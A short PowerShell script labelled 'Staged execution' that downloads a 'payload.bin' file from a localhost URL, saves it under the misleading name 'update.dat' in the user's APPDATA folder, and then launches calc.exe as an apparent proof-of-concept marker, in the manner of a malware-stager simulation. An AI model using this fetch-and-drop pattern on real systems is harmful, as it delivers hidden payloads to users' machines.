<# Staged execution #>
[CmdletBinding()]
param(
    [string]$Stage1Url = 'https://localhost:8000/payload.bin',
    [string]$DownloadPath = "$env:APPDATA\update.dat"
)
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $DownloadPath)
Start-Process -FilePath "calc.exe"
Start-Sleep -Seconds 6
